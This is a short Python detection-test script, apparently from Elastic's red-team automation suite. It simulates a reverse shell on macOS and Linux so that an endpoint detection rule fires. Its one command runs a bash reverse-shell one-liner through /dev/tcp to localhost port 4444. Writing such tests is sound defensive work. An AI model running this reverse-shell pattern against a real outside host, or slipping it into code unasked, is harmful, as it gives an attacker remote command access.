# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)

@register_code_rta(
    id="83b04be5-ed0f-4efd-a7fd-d5db2b8ab62f",
    name="reverse_shell",
    platforms=[OSType.MACOS, OSType.LINUX],
    endpoint_rules=[
        RuleMetadata(id="d0e45f6c-1f83-4d97-a8d9-c8f9eb61c15c", name="Potential Reverse Shell Activity via Terminal")
    ],
    techniques=["T1071", "T1059"],
)
def main():
    log.info("Executing command to simulate reverse shell execution")
    _ = _common.execute_command(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)
